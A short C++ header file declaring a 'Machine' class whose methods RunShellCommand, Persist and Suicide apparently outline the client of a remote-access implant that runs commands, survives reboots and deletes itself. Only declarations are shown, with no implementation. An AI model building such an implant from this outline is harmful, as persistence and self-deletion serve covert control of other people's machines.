#pragma once
#include <string>
#include <vector>

class Machine
{
public:
	std::string RunShellCommand(std::string);
	void Persist();
	void Suicide();
};
